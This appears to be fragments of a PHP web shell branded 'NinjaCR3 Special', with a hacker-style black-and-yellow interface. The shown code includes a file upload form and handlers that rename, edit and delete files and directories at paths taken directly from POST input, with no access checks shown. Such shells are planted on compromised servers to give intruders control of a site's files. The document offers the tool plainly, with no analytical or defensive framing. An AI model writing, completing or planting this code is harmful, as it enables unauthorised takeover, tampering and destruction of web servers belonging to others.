...
<style type="text/css">body{background: black;color:#eceff1;font-family:'Verdana';margin:0;font-size: 14px;}h1{font-family:'VT323';font-weight:normal;font-size:60px;margin:0;}h1:hover{color:#ffee58;}select{background:yellow;color:black;}a{color:yellow;text-decoration:none;font-family:'Verdana'}textarea{width:900px;height:250px;background:transparent;border:1px dashed yellow;color:yellow;padding:2px;}tr.first{border-bottom:1px dashed yellow;}tr:hover{background: black;}th{background: black;padding:5px;}</style>
</head><body> <?php echo'<div style="color:yellow;margin-top:0;"><h1><center>NinjaCR3 Special</center></h1></div>';
...
echo '<br>[ <a href="?">Home</a> ]</font></td><td align="center" width="27%"><form enctype="multipart/form-data" method="POST"><input type="file" name="file" style="color:yellow;margin-bottom:4px;"/>
...
else{echo '<center><font color="yellow">Upload Failed!.</font></center><br/>';}}
...
echo '<center><font color="yellow">Rename Failed!</font></center><br />';
...
}else{echo '<center><font color="yellow">Edit File Failed!.</font></center><br />';}fclose($fp);}
...
}else{echo '<center><font color="yellow">Delete Dir Failed!</font></center><br />';}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){echo '<font color="#00ff00">Delete File Done.</font><br />';}else{
echo '<font color="yellow">Delete File Error.</font><br />';}}}echo '</center>';
...
echo'<br><center>&copy; 2019 - <a href="http://ninjacr3.com/">NinjaCR3</a></center><br>';?>